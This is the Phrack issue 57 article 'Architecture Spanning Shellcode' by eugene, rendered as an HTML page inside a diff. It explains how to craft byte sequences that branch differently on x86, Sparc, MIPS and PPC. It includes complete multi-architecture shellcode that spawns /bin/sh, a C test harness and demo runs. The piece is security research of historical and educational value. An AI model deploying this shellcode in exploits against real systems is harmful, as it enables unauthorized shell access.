@@ -1,0 +1,779 @@
+<?xml version="1.0" encoding="utf-8" ?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en">
+<head>
+   <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+   <meta http-equiv="content-language" content="en" />
+   <meta name="description" content="Phrack staff website." />
+   <meta name="keywords" content="phrack" />
+   <meta name="robots" content="follow,index,all" />
+
+   <meta name="revisit-after" content="7 days" />
+   
+   <title>.:: Phrack Magazine ::.</title>
+   
+   <link href="../../css/style.css" rel="stylesheet" type="text/css">
+</head>
+<body id="top">
+<div align="center" class="texto-2-bold">
+[ <a href="../../index.html" title="News">News</a> ]
+[ <a href="../../" title="Paper Feed">Paper Feed</a> ]
+[ <a href="../../issues/71/1.html" title="Issues">Issues</a> ]
+[ <a href="../../authors.html" title="Authors">Authors</a> ]
+[ <a href="../../archives/" title="Archives">Archives</a> ]
+[ <a href="../../contact.html" title="Contact">Contact</a> ]
+
+</div>
+
+<center>
+   <br>
+   <br>
+   <img width="600" src="../../images/phrack-logo.jpg" alt="..[ Phrack Magazine ]..">
+   <br>
+
+   <div class="texto-2">
+   <div class="p-title">.:: Architecture spanning shellcode ::.</div>
+   <hr width="600" />
+   </div>
+   
+   <div style="padding-top: 4px; padding-bottom: 4px;">
+<div class="around">
+
+<div class="details"><strong>Issues</strong>: 
+[ <a href="../../issues/1/1.html" title="Issue 1">1</a> ] [ <a href="../../issues/2/1.html" title="Issue 2">2</a> ] [ <a href="../../issues/3/1.html" title="Issue 3">3</a> ] [ <a href="../../issues/4/1.html" title="Issue 4">4</a> ] [ <a href="../../issues/5/1.html" title="Issue 5">5</a> ] [ <a href="../../issues/6/1.html" title="Issue 6">6</a> ] [ <a href="../../issues/7/1.html" title="Issue 7">7</a> ] [ <a href="../../issues/8/1.html" title="Issue 8">8</a> ] [ <a href="../../issues/9/1.html" title="Issue 9">9</a> ] [ <a href="../../issues/10/1.html" title="Issue 10">10</a> ] [ <a href="../../issues/11/1.html" title="Issue 11">11</a> ] [ <a href="../../issues/12/1.html" title="Issue 12">12</a> ] [ <a href="../../issues/13/1.html" title="Issue 13">13</a> ] [ <a href="../../issues/14/1.html" title="Issue 14">14</a> ] [ <a href="../../issues/15/1.html" title="Issue 15">15</a> ] [ <a href="../../issues/16/1.html" title="Issue 16">16</a> ] [ <a href="../../issues/17/1.html" title="Issue 17">17</a> ] [ <a href="../../issues/18/1.html" title="Issue 18">18</a> ] [ <a href="../../issues/19/1.html" title="Issue 19">19</a> ] [ <a href="../../issues/20/1.html" title="Issue 20">20</a> ] [ <a href="../../issues/21/1.html" title="Issue 21">21</a> ] [ <a href="../../issues/22/1.html" title="Issue 22">22</a> ] [ <a href="../../issues/23/1.html" title="Issue 23">23</a> ] [ <a href="../../issues/24/1.html" title="Issue 24">24</a> ] [ <a href="../../issues/25/1.html" title="Issue 25">25</a> ] [ <a href="../../issues/26/1.html" title="Issue 26">26</a> ] [ <a href="../../issues/27/1.html" title="Issue 27">27</a> ] [ <a href="../../issues/28/1.html" title="Issue 28">28</a> ] [ <a href="../../issues/29/1.html" title="Issue 29">29</a> ] [ <a href="../../issues/30/1.html" title="Issue 30">30</a> ] [ <a href="../../issues/31/1.html" title="Issue 31">31</a> ] [ <a href="../../issues/32/1.html" title="Issue 32">32</a> ] [ <a href="../../issues/33/1.html" title="Issue 33">33</a> ] [ <a href="../../issues/34/1.html" title="Issue 34">34</a> ] [ <a href="../../issues/35/1.html" title="Issue 35">35</a> ] [ <a href="../../issues/36/1.html" title="Issue 36">36</a> ] [ <a href="../../issues/37/1.html" title="Issue 37">37</a> ] [ <a href="../../issues/38/1.html" title="Issue 38">38</a> ] [ <a href="../../issues/39/1.html" title="Issue 39">39</a> ] [ <a href="../../issues/40/1.html" title="Issue 40">40</a> ] [ <a href="../../issues/41/1.html" title="Issue 41">41</a> ] [ <a href="../../issues/42/1.html" title="Issue 42">42</a> ] [ <a href="../../issues/43/1.html" title="Issue 43">43</a> ] [ <a href="../../issues/44/1.html" title="Issue 44">44</a> ] [ <a href="../../issues/45/1.html" title="Issue 45">45</a> ] [ <a href="../../issues/46/1.html" title="Issue 46">46</a> ] [ <a href="../../issues/47/1.html" title="Issue 47">47</a> ] [ <a href="../../issues/48/1.html" title="Issue 48">48</a> ] [ <a href="../../issues/49/1.html" title="Issue 49">49</a> ] [ <a href="../../issues/50/1.html" title="Issue 50">50</a> ] [ <a href="../../issues/51/1.html" title="Issue 51">51</a> ] [ <a href="../../issues/52/1.html" title="Issue 52">52</a> ] [ <a href="../../issues/53/1.html" title="Issue 53">53</a> ] [ <a href="../../issues/54/1.html" title="Issue 54">54</a> ] [ <a href="../../issues/55/1.html" title="Issue 55">55</a> ] [ <a href="../../issues/56/1.html" title="Issue 56">56</a> ] [ <a class="current" href="../../issues/57/1.html" title="Issue 57">57</a> ] [ <a href="../../issues/58/1.html" title="Issue 58">58</a> ] [ <a href="../../issues/59/1.html" title="Issue 59">59</a> ] [ <a href="../../issues/60/1.html" title="Issue 60">60</a> ] [ <a href="../../issues/61/1.html" title="Issue 61">61</a> ] [ <a href="../../issues/62/1.html" title="Issue 62">62</a> ] [ <a href="../../issues/63/1.html" title="Issue 63">63</a> ] [ <a href="../../issues/64/1.html" title="Issue 64">64</a> ] [ <a href="../../issues/65/1.html" title="Issue 65">65</a> ] [ <a href="../../issues/66/1.html" title="Issue 66">66</a> ] [ <a href="../../issues/67/1.html" title="Issue 67">67</a> ] [ <a href="../../issues/68/1.html" title="Issue 68">68</a> ] [ <a href="../../issues/69/1.html" title="Issue 69">69</a> ] [ <a href="../../issues/70/1.html" title="Issue 70">70</a> ] [ <a href="../../issues/71/1.html" title="Issue 71">71</a> ] 
+</div>
+<div class="opt" align="center"><div class="rt"><a href="../../archives/tgz/phrack57.tar.gz" title="Get current issue tar.gz">Get tar.gz</a></div><strong>Current issue</strong> : #<a href="../../archives/tgz/phrack57.tar.gz" title="Get current issue tar.gz">57</a> | <strong>Release date</strong> : <b>2001-08-11</b> | <strong>Editor</strong> : <b>Phrack Staff</b></div>
+
+<div style="border-top: 1px solid black; border-bottom: 2px solid black">
+<table class="tissue" cellpadding="0" cellspacing="0">
+   <tbody>
+      <tr><td align="left"><a href="../../issues/57/1.html#article">Introduction</a></td><td align="right">Phrack Staff</td></tr>
+<tr><td align="left"><a href="../../issues/57/2.html#article">Phrack Loopback</a></td><td align="right">Phrack Staff</td></tr>
+<tr><td align="left"><a href="../../issues/57/3.html#article">Phrack Line Noise</a></td><td align="right">Phrack Staff</td></tr>
+<tr><td align="left"><a href="../../issues/57/4.html#article">Editorial policy</a></td><td align="right">Phrack Staff</td></tr>
+<tr><td align="left"><a href="../../issues/57/5.html#article">IA64 shellcode</a></td><td align="right">papasutra</td></tr>
+<tr><td align="left"><a href="../../issues/57/6.html#article">Taranis read your e-mail</a></td><td align="right">jwilkins</td></tr>
+<tr><td align="left"><a href="../../issues/57/7.html#article">ICMP based OS fingerprinting</a></td><td align="right">Ofir Arkin &amp; Fyodor Yarochkin</td></tr>
+<tr><td align="left"><a href="../../issues/57/8.html#article">Vudo malloc tricks</a></td><td align="right">MaXX</td></tr>
+<tr><td align="left"><a href="../../issues/57/9.html#article">Once upon a free()</a></td><td align="right">anonymous author</td></tr>
+<tr><td align="left"><a href="../../issues/57/10.html#article">Against the System: Rise of the Robots</a></td><td align="right">Michal Zalewski</td></tr>
+<tr><td align="left"><a href="../../issues/57/11.html#article">Holistic approaches to attack detection</a></td><td align="right">sasha</td></tr>
+<tr><td align="left"><a href="../../issues/57/12.html#article">NIDS on mass parallel processing architecture</a></td><td align="right">storm</td></tr>
+<tr><td align="left"><a href="../../issues/57/13.html#article">Hang on, snoopy</a></td><td align="right">stealth</td></tr>
+<tr><td align="left"><a href="../../issues/57/14.html#article">Architecture spanning shellcode</a></td><td align="right">eugene</td></tr>
+<tr><td align="left"><a href="../../issues/57/15.html#article">Writing ia32 alphanumeric shellcodes</a></td><td align="right">rix</td></tr>
+<tr><td align="left"><a href="../../issues/57/16.html#article">Cupass and the netuserchangepassword problem</a></td><td align="right">D.Holiday</td></tr>
+<tr><td align="left"><a href="../../issues/57/17.html#article">Phrack World News</a></td><td align="right">Phrack Staff</td></tr>
+<tr><td align="left"><a href="../../issues/57/18.html#article">Phrack magazine extraction utility</a></td><td align="right">Phrack Staff</td></tr>
+
+   </tbody>
+</table>
+
+<div class="opt" id="article"><strong>Title</strong> : Architecture spanning shellcode</div>
+<div class="opt-bottom"> <strong>Author</strong> : eugene</div>
+<pre>                             ==Phrack Inc.==
+
+               Volume 0x0b, Issue 0x39, Phile #0x0e of 0x12
+
+|=---------------=[ Architecture Spanning Shellcode ]=-------------------=|
+|=-----------------------------------------------------------------------=|
+|=--------------------=[ eugene@gravitino.net ]=-------------------------=|
+
+
+
+Introduction
+------------
+
+  At defcon8 caezar's challenge 4 party [1] a problem was present to write
+a shellcode that would run on two or more processor platforms. Below you
+will find my solution (don't forget to check the credits section).
+
+  The general idea behind an architecture spanning shellcode is trying
+to come up with a sequence of bytes that would execute a jump instruction
+on one architecture while executing a nop-like instruction on another
+architecture. That way we can branch to architecture specific code
+depending on the platform our code is running on.
+
+  Here is an ASCII representation of our byte stream:
+
+XXX
+arch1 shellcode
+arch2 shellcode
+
+where XXX is a sequence of bytes that is going to branch to arch2's
+shellcode on architecture 2 and is going to fall through to arch1
+shellcode on architecture 1.
+
+  If we want to add more platforms we would need to add additional
+jump/nop instructions for each additional platform.
+
+
+
+MIPS architecture
+------------------
+
+  A brief introduction to the MIPS architecture and writing MIPS shellcode
+was described by scut in phrack 56 [2] as well as by the LSD folks in their
+paper [8].
+
+  The only thing that is worse repeating here is the general MIPS
+instruction format. All MIPS instructions occupy 32 bits and the sixth most
+significant bits specify the instruction opcode [6][7]. There are 3
+instruction formats: I-Type (immediate), J-Type (Jump) and
+R-Type (Register). Since we are looking for a nop-like instructions we are
+mostly interesting in I and R type instructions whose format is listed
+below.
+
+
+I-Type instruction format:
+
+31 30 29 28 27 26|25 24 23 22 21| 20 19 18 17 16| 15 .. 0
+        op       |       rs     |        rt     | immediate
+
+fields are:
+	op		6-bit operation code
+	rs		5-bit source register specifier
+	rt		5-bit target (src/dest) or branch condition
+	immediate	16-bit immediate, branch or address displacement
+
+
+
+R-Type instruction format:
+
+31 30 29 28 27 26|25 24 23 22 21| 20 19 18 17 16| 15 14 131211|109876|5..0
+        op       |       rs     |        rt     |      rd     | shamt|funct
+
+fields are:
+	op		6-bit operation code
+	rs		5-bit source register specifier
+	rt		5-bit target (src/dest) or branch condition
+	rd		5-bit destination register specifier
+	shamt		5-bit shift amount
+	funct		6-bit function field
+
+
+
+Sparc architecture
+------------------
+
+  Similarly to MIPS, Sparc is a RISC based architecture. All the Sparc
+instructions occupy 32 bits and the two most significant bits specify an
+instruction class [4]:
+
+
+op	Instruction Class
+
+00	Branch instructions
+01	call instruction
+10	Format Three instructions (type 1)
+11	Format Three instructions (type 2)
+
+
+  Format one call instruction contains an op field '01' followed by 30 bits
+of address. Even though this is the optimal instruction to use, since we
+control 30 bits out of 32, we won't be able to use it since the jumps are
+not relative and tend to have 0 bytes in them.
+
+  Format three instructions (type 2) are mostly load/store instructions
+which are mostly useless to us since we are only looking for relatively
+harmless nop-like instructions. We definitely don't want to use anything
+that has possibility of crashing our program (SIGSEGV in case of an illegal
+load/store).
+
+  This leaves us with branch and format three instructions (type 1) to use.
+Here is the format of a format three instruction:
+
+
+31 30 |29 28 27 26 25|24 23 22 21 20 19|18 17 16 15 14|13|12 11 10 9 8 7..0
+  op  |       rd     |      op3        |       rs1    |01|    rs2 / imm
+
+fields are:
+	op		2-bit instruction class (10)
+	rd		5-bit destination register specifier
+	op3		5-bit instruction specifier
+	rs1		5-bit source register
+	0/1		1-bit constant / second source register option
+	rs2 / imm	13-bit specifies either a second source register or
+                               a constant
+
+  Some of the promising looking (harmless) format three instructions are
+add, and, or, xor and sll/srl (specified by op3 bits).
+
+And here is the branch instruction format:
+
+31 30 |29|28 27 26 25|24 23 22|21 .. 0
+  op  |a | condition |   op2  |displacement
+
+fields are:
+	op		2-bit instruction class (00)
+	a		1-bit annulled flag
+	condition	5-bit condition specifier.. ba, bn, bl, ble, be, etc
+	op2		3-bit condition code (integer condition code is 010)
+	displacement	22-bit address displacement
+
+
+  As you can see, a lot of the fields already have predefined values which
+we need to work around.
+
+
+PPC architecture
+----------------
+
+  PowerPC is yet another RISC architecture used by vendors such as IBM and
+Apple. See LSD's paper [8] for more information.
+
+
+x86 architecture
+----------------
+
+  The topic of buffer overflows and shellcode on x86 architecture has been
+beaten to death before. For a good introduction see Aleph1's article in
+phrack 49 [3].
+
+  To expand just a little bit on the topic I am going to present x86 code
+that works on multiple x86 operating systems. The idea behind an
+&quot;OS spanning&quot; shellcode is to setup all the registers and stack in such a
+way as to satisfy the requirements of all the operating systems that our
+shellcode is meant to execute on. For example, BSD passes its parameters on
+stack while Linux uses registers (for passing arguments to syscalls). If we
+setup both registers and stack than our code would run on both BSD and
+Linux x86 systems. The only problem with writing shellcode for BSD &amp; Linux
+systems is the different execve() syscall numbers the two systems use.
+Linux uses syscall number 0xb while BSD uses 0x3b. To overcome this
+problem, we need to distinguish between the two systems at runtime.
+There are plenty of ways to do that such as checking where various segments
+are mapped, the way segment registers are setup, etc. I chose to analyze
+the segment registers since that method seems to be pretty robust. On Linux
+systems, for example, segment registers fs and gs are set 0 (in user mode)
+while on BSD systems they are set to non zero values (0x1f on OpenBSD,
+0x2f on FreeBSD). We can exploit that difference to distinguish between the
+two different systems. See &quot;Adding more architectures&quot; section for a
+working example.
+
+  Another way to to handle different syscall numbers is to ignore an
+&quot;invalid system call&quot; SIGSYS signal and just try a different syscall number
+if the first execve() call failed. While that method certainly works it
+is quite limited and cannot be applied to other operating systems such as
+the x86 Solaris which doesn't use the 0x80 interrupt trap gate.
+
+  Note that the &quot;OS Spanning&quot; shellcode is certainly not restricted to an
+x86 platform, the same idea can be applied to any hardware platform and any
+operating system.
+
+
+
+Putting it all together.. Architecture spanning shellcode
+---------------------------------------------------------
+
+  As I have mentioned before our shellcode (first attempt) is going to look
+like
+
+XXX
+arch1 shellcode
+arch2 shellcode
+
+where XXX is a specially crafted string that executes different
+instructions on two different platforms.
+
+  When I initially started looking for a working XXX string, I took an x86
+short jump instruction and tried to decode it on a sun box. Since the
+first byte of an x86 short jump instruction is 0xEB (which is almost all
+1's) [5], the instruction decoded into a weird format 3 sparc instruction.
+My next attempt consisted of writing a sparc jump instruction and trying to
+decode it on an x86 platform. That idea almost worked but i was unable to
+decode the sparc jump instruction into a nop-like x86 xor instruction due
+to a one bit offset difference. The next attempt consisted of padding an
+x86 jump instruction. Since an x86 short jump instruction is 2 bytes long
+and all the sparc instructions are 4 bytes long, I had 2 bytes to play
+with. I knew that I had to insert some bytes before the jump 0xEB byte in
+order to be able to decode the instruction into something reasonable on
+sparc. For my pad bytes I chose to use the x86 0x90 nop bytes which turned
+out to be a good idea since 0x90 is mostly all 0's. My instruction stream
+than looked like
+
+\x90\x90\xeb\x30
+
+where 0x90 is the x86 nop instruction, 0xEB is the opcode for an x86 short
+jump and 0x30 is a 48 byte jump offset. Here is what the above string
+decoded to on a Sun machine:
+
+(gdb) x 0x1054c
+0x1054c &lt;main+20&gt;:      0x9090eb30
+
+(gdb) x/t 0x1054c
+0x1054c &lt;main+20&gt;:      10010000100100001110101100110000
+
+(gdb) x/i 0x1054c
+0x1054c &lt;main+20&gt;:      orcc  %g3, 0xb30, %o0
+
+  As you can see, our string decoded to a harmless format 3 'or'
+instruction that corrupted the %o0 register. This is exactly what we were
+looking for, a short jump on one architecture (x86) and a harmless
+instruction on another architecture (sparc). With that in mind our
+shellcode now looks like this:
+
+\x90\x90\xeb\x30
+[sparc shellcode]
+[x86 shellcode]
+
+
+Let's try it out..
+
+
+[openbsd]$ cat ass.c		; ass as in Architecture Spanning Shellcode :)
+char sc[] =
+	/* magic string */
+	&quot;\x90\x90\xeb\x30&quot;
+
+	/* sparc solaris execve() */
+	&quot;\x2d\x0b\xd8\x9a&quot;                   /* sethi $0xbd89a, %l6        */
+	&quot;\xac\x15\xa1\x6e&quot;                   /* or %l6, 0x16e, %l6         */
+	&quot;\x2f\x0b\xdc\xda&quot;                   /* sethi $0xbdcda, %l7        */
+	&quot;\x90\x0b\x80\x0e&quot;                   /* and %sp, %sp, %o0          */
+	&quot;\x92\x03\xa0\x08&quot;                   /* add %sp, 8, %o1            */
+	&quot;\x94\x1a\x80\x0a&quot;                   /* xor %o2, %o2, %o2          */
+	&quot;\x9c\x03\xa0\x10&quot;                   /* add %sp, 0x10, %sp         */
+	&quot;\xec\x3b\xbf\xf0&quot;                   /* std %l6, [%sp - 0x10]      */
+	&quot;\xdc\x23\xbf\xf8&quot;                   /* st %sp, [%sp - 0x08]       */
+	&quot;\xc0\x23\xbf\xfc&quot;                   /* st %g0, [%sp - 0x04]       */
+	&quot;\x82\x10\x20\x3b&quot;                   /* mov $0x3b, %g1             */
+	&quot;\x91\xd0\x20\x08&quot;                   /* ta 8                       */
+
+	/* BSD execve() */
+        &quot;\xeb\x17&quot;                      /* jmp */
+        &quot;\x5e&quot;                          /* pop  %esi */
+        &quot;\x31\xc0&quot;                      /* xor  %eax, %eax */
+        &quot;\x50&quot;                          /* push %eax */
+        &quot;\x88\x46\x07&quot;                  /* mov  %al,0x7(%esi) */
+        &quot;\x89\x46\x0c&quot;                  /* mov  %eax,0xc(%esi) */
+        &quot;\x89\x76\x08&quot;                  /* mov  %esi,0x8(%esi) */
+        &quot;\x8d\x5e\x08&quot;                  /* lea  0x8(%esi),%ebx */
+        &quot;\x53&quot;                          /* push %ebx */
+        &quot;\x56&quot;                          /* push %esi */
+        &quot;\x50&quot;                          /* push %eax */
+        &quot;\xb0\x3b&quot;                      /* mov  $0x3b, %al */
+        &quot;\xcd\x80&quot;                      /* int  $0x80 */
+        &quot;\xe8\xe4\xff\xff\xff&quot;          /* call */
+        &quot;\x2f\x62\x69\x6e\x2f\x73\x68&quot;; /* /bin/sh */
+
+
+int main(void)
+{
+        void (*f)(void) = (void (*)(void)) sc;
+
+        f();
+
+        return 0;
+}
+
+
+[openbsd]$ gcc ass.c
+[openbsd]$ ./a.out
+$ uname -ms
+OpenBSD i386
+
+[solaris]$ gcc ass.c
+[solaris]$ ./a.out
+$ uname -ms
+SunOS sun4u
+
+it worked!
+
+
+
+Adding more architectures
+-------------------------
+
+  Theoretically, spanning shellcode is not tied to any specific operating
+system nor any specific hardware architecture. Thus it should be possible
+to write shellcode that runs on more than two architectures. The format
+for our shellcode (second attempt) that runs on 3 architectures is going
+to be
+
+XXX
+YYY
+arch1 shellcode
+arch2 shellcode
+arch3 shellcode
+
+where arch1 is MIPS, arch2 is Sparc and arch3 is x86.
+
+  My first attempt was to try and reuse the magic string from ass.c.
+Unfortunately, 0x9090eb30 didn't decode into anything reasonable on an IRIX
+platform and so I was forced to look elsewhere. My next attempt was to
+replace 0x90 bytes with some other nop-like bytes looking for a sequence
+that would work on both Sparc &amp; MIPS platforms. After a trying out a bunch
+of x86 nop instructions from K2's ADMmutate toolkit, I stumbled upon an AAA
+instruction whose opcode was 0x37. The AAA instruction worked out great
+since the 0x3737eb30 string decoded correctly on all three platforms:
+
+x86:
+	aaa
+	aaa
+	jmp +120
+
+sparc:
+	sethi  %hi(0xdFADE000), %i3
+
+mips:
+	ori $s7,$t9,0xeb78
+
+
+with XXX string out of the way, I was left with MIPS and Sparc platforms
+YYY part. The very first instruction I tried worked on both platforms.
+The instruction was a Sparc annulled short jump ba,a (0x30800012) which
+decoded to
+
+andi $zero,$a0,0x12
+
+on a MIPS platform. Not only did the jump instruction decoded to a harmless
+'andi' on a MIPS platform, it also didn't require a branch delay slot
+instruction after it since the ba jump was annulled [4].
+So now our shellcode looks like this
+
+
+        &quot;\x37\x37\xeb\x78&quot;      /* x86:         aaa; aaa; jmp 116+4     */
+                                /* MIPS:        ori $s7,$t9,0xeb78      */
+                                /* Sparc:       sethi %hi(0xdfade000),%i3*/
+
+        &quot;\x30\x80\x00\x12&quot;      /* MIPS:        andi $zero,$a0,0x12     */
+                                /* Sparc:       ba,a +72                */
+
+	[snip real shellcode]
+
+
+  While we are adding more architectures to our shellcode let's also take
+a look at PPC/AIX. The first logical thing to do is to try and decode
+the existing XXX and YYY strings from the above shellcode on the PPC
+platform:
+
+(gdb) x 0x10000364
+0x10000364 &lt;main+36&gt;:   0x3737eb78
+
+(gdb) x/i 0x10000364
+0x10000364 &lt;main+36&gt;:   addic.  r25,r23,-5256
+
+(gdb) x/x 0x10000368
+0x10000368 &lt;main+40&gt;:   0x30800012
+
+(gdb) x/i 0x10000368
+0x10000368 &lt;main+40&gt;:   addic   r4,r0,18
+
+is this our lucky day or what? the XXX and YYY strings from the above
+MIPS/x86/Sparc combo have correctly decoded to two harmless add
+instructions. All we need to do now is to come up with another instruction
+that is going to execute a jump on a MIPS platform while executing a nop on
+PPC/AIX. After a bit of searching MIPS 'bgtz' instruction turned out to
+decode into a valid multiply instruction on AIX:
+
+
+[MIPS]
+(gdb) x 0x10001008
+0x10001008 &lt;sc+8&gt;:      0x1ee00101
+
+(gdb) x/i 0x10001008
+0x10001008 &lt;sc+8&gt;:      bgtz $s7,0x10001410 &lt;+1040&gt;
+
+
+[AIX]
+(gdb) x 0x10000378
+0x10000378 &lt;main+56&gt;:   0x1ee00101
+
+(gdb) x/i 0x10000378
+0x10000378 &lt;main+56&gt;:   mulli   r23,r0,257
+
+the bgtz instruction is a branch on greater than zero [7]. Notice that the
+branch instruction uses the $s7 register which was modified by us in a
+previous nop instruction. The branch displacement is set to 0x0101 (to
+avoid NULL bytes in the instruction) which is equivalent to a relative
+1028 byte forward jump. Let's put everything together now..
+
+
+
+[openbsd]$ cat ass.c
+
+/*
+ * Architecture/OS Spanning Shellcode
+ *
+ * runs on x86 (freebsd, netbsd, openbsd, linux), MIPS/Irix, Sparc/Solaris
+ * and PPC/AIX (AIX platforms require -DAIX compiler flag)
+ *
+ * eugene@gravitino.net
+ */
+
+char sc[] =
+	/* voodoo */
+	&quot;\x37\x37\xeb\x7b&quot;	/* x86:		aaa; aaa; jmp 116+4	*/
+				/* MIPS:	ori	$s7,$t9,0xeb7b	*/
+				/* Sparc:	sethi	%hi(0xdFADEc00), %i3 */
+				/* PPC/AIX:	addic.	r25,r23,-5253	*/
+
+	&quot;\x30\x80\x01\x14&quot;	/* MIPS:	andi	$zero,$a0,0x114	*/
+				/* Sparc: 	ba,a	+1104		*/
+				/* PPC/AIX:	addic   r4,r0,276	*/
+
+	&quot;\x1e\xe0\x01\x01&quot;	/* MIPS:	bgtz	$s7, +1032	*/
+				/* PPC/AIX:	mulli	r23,r0,257	*/
+
+	&quot;\x30\x80\x01\x14&quot;	/* fill in the MIPS branch delay slot
+				   with the above MIPS / AIX nop	*/
+
+
+	/* PPC/AIX shellcode by LAST STAGE OF DELIRIUM	*://lsd-pl.net/	*/
+	&quot;\x7e\x94\xa2\x79&quot;	/* xor.		r20,r20,r20		*/
+	&quot;\x40\x82\xff\xfd&quot;	/* bnel		&lt;syscallcode&gt;		*/
+	&quot;\x7e\xa8\x02\xa6&quot;	/* mflr		r21			*/
+	&quot;\x3a\xc0\x01\xff&quot;	/* lil		r22,0x1ff		*/
+	&quot;\x3a\xf6\xfe\x2d&quot;	/* cal		r23,-467(r22)		*/
+	&quot;\x7e\xb5\xba\x14&quot;	/* cax		r21,r21,r23		*/
+	&quot;\x7e\xa9\x03\xa6&quot;	/* mtctr	r21			*/
+	&quot;\x4e\x80\x04\x20&quot;	/* bctr					*/
+
+	&quot;\x04\x82\x53\x71&quot;
+	&quot;\x87\xa0\x89\xfc&quot;
+	&quot;\x69\x68\x67\x65&quot;
+
+	&quot;\x4c\xc6\x33\x42&quot;	/* crorc	cr6,cr6,cr6		*/
+	&quot;\x44\xff\xff\x02&quot;	/* svca		0x0			*/
+	&quot;\x3a\xb5\xff\xf8&quot;	/* cal		r21,-8(r21)		*/
+
+	&quot;\x7c\xa5\x2a\x79&quot;	/* xor.		r5,r5,r5		*/
+	&quot;\x40\x82\xff\xfd&quot;	/* bnel		&lt;shellcode&gt;		*/
+	&quot;\x7f\xe8\x02\xa6&quot;	/* mflr		r31			*/
+	&quot;\x3b\xff\x01\x20&quot;	/* cal		r31,0x120(r31)		*/
+	&quot;\x38\x7f\xff\x08&quot;	/* cal		r3,-248(r31)		*/
+	&quot;\x38\x9f\xff\x10&quot;	/* cal		r4,-240(r31)		*/
+	&quot;\x90\x7f\xff\x10&quot;	/* st		r3,-240(r31)		*/
+	&quot;\x90\xbf\xff\x14&quot;	/* st		r5,-236(r31)		*/
+	&quot;\x88\x55\xff\xf4&quot;	/* lbz		r2,-12(r21)		*/
+	&quot;\x98\xbf\xff\x0f&quot;	/* stb		r5,-241(r31)		*/
+	&quot;\x7e\xa9\x03\xa6&quot;	/* mtctr	r21			*/
+	&quot;\x4e\x80\x04\x20&quot;	/* bctr					*/
+	&quot;/bin/sh&quot;
+
+
+	/* x86 BSD/Linux execve() by me */
+        &quot;\xeb\x29&quot;		/* jmp					*/
+        &quot;\x5e&quot;			/* pop		%esi			*/
+        &quot;\x31\xc0&quot;		/* xor		%eax, %eax		*/
+        &quot;\x50&quot;			/* push		%eax 			*/
+        &quot;\x88\x46\x07&quot;		/* mov		%al,0x7(%esi) 		*/
+        &quot;\x89\x46\x0c&quot;		/* mov		%eax,0xc(%esi)		*/
+        &quot;\x89\x76\x08&quot;		/* mov		%esi,0x8(%esi)		*/
+        &quot;\x8d\x5e\x08&quot;		/* lea		0x8(%esi),%ebx		*/
+        &quot;\x53&quot;			/* push		%ebx			*/
+        &quot;\x56&quot;			/* push		%esi			*/
+        &quot;\x50&quot;			/* push		%eax			*/
+
+        /* setup registers for linux */
+        &quot;\x8d\x4e\x08&quot;		/* lea		0x8(%esi),%ecx		*/
+        &quot;\x8d\x56\x08&quot;		/* lea		0x8(%esi),%edx		*/
+        &quot;\x89\xf3&quot;		/* mov		%esi, %ebx		*/
+
+        /* distinguish between BSD &amp; Linux */
+        &quot;\x8c\xe0&quot;		/* movl		%fs, %eax		*/
+        &quot;\x21\xc0&quot;		/* andl		%eax, %eax		*/
+        &quot;\x74\x04&quot;		/* jz		+4			*/
+        &quot;\xb0\x3b&quot;		/* mov		$0x3b, %al		*/
+        &quot;\xeb\x02&quot;		/* jmp		+2			*/
+        &quot;\xb0\x0b&quot;		/* mov		$0xb, %al		*/
+
+        &quot;\xcd\x80&quot;		/* int		$0x80			*/
+
+        &quot;\xe8\xd2\xff\xff\xff&quot;	/* call					*/
+        &quot;\x2f\x62\x69\x6e&quot;	/* /bin					*/
+	&quot;\x2f\x73\x68&quot;		/* /sh					*/
+
+
+	/*
+	 * pad the MIPS/Irix &amp; Sparc/Solaris shellcodes
+	 * jumps of &gt; 0x0101 bytes are performed on both platforms
+	 * to avoid NULL bytes in the jump instructions
+	 */
+	&quot;2359595912811011811145128130124118116118121114127231291301241171&quot;
+	&quot;2911813245571341291181211101231241181291101234512913012411712911&quot;
+	&quot;8132455712712412112411245123118120128451291301241171291181324512&quot;
+	&quot;9128118133114451141004559113130110111451141171294511512445134129&quot;
+	&quot;1301101141112311411712945571171121291181321284511411712945113123&quot;
+	&quot;1104512312412712911211412111445114117129451151244511312112712413&quot;
+	&quot;2451141171294559595913212412345113121127124132451271301244512811&quot;
+	&quot;8451281181179797117118128451181284512413012745132124127121113451&quot;
+	&quot;2312413259595945129117114451321241271211134512411545129117114451&quot;
+	&quot;1412111411212912712412345110123113451291171144512813211812911211&quot;
+	&quot;7574512911711423111114110130129134451241154512911711445111110130&quot;
+	&quot;1135945100114451141331181281294513211812911712413012945128120118&quot;
+	&quot;1234511212412112412757451321181291171241301294512311012911812412&quot;
+	&quot;31101211181291345745132118&quot;
+
+
+        /* 68 byte MIPS/Irix PIC execve shellcode. -scut/teso		*/
+        &quot;\xaf\xa0\xff\xfc&quot;      /* sw           $zero, -4($sp)          */
+        &quot;\x24\x06\x73\x50&quot;      /* li           $a2, 0x7350             */
+        &quot;\x04\xd0\xff\xff&quot;      /* bltzal       $a2, dpatch             */
+        &quot;\x8f\xa6\xff\xfc&quot;      /* lw           $a2, -4($sp)            */
+
+        /* a2 = (char **) envp = NULL */
+        &quot;\x24\x0f\xff\xcb&quot;      /* li           $t7, -53                */
+        &quot;\x01\xe0\x78\x27&quot;      /* nor          $t7, $t7, $zero         */
+        &quot;\x03\xef\xf8\x21&quot;      /* addu         $ra, $ra, $t7           */
+
+        /* a0 = (char *) pathname */
+        &quot;\x23\xe4\xff\xf8&quot;      /* addi         $a0, $ra, -8            */
+
+        /* fix 0x42 dummy byte in pathname to shell */
+        &quot;\x8f\xed\xff\xfc&quot;      /* lw           $t5, -4($ra)            */
+        &quot;\x25\xad\xff\xbe&quot;      /* addiu        $t5, $t5, -66           */
+        &quot;\xaf\xed\xff\xfc&quot;      /* sw           $t5, -4($ra)            */
+
+        /* a1 = (char **) argv */
+        &quot;\xaf\xa4\xff\xf8&quot;      /* sw           $a0, -8($sp)            */
+        &quot;\x27\xa5\xff\xf8&quot;      /* addiu        $a1, $sp, -8            */
+
+        &quot;\x24\x02\x04\x23&quot;      /* li           $v0, 1059 (SYS_execve)  */
+        &quot;\x01\x01\x01\x0c&quot;      /* syscall                              */
+        &quot;\x2f\x62\x69\x6e&quot;      /* .ascii       &quot;/bin&quot;                  */
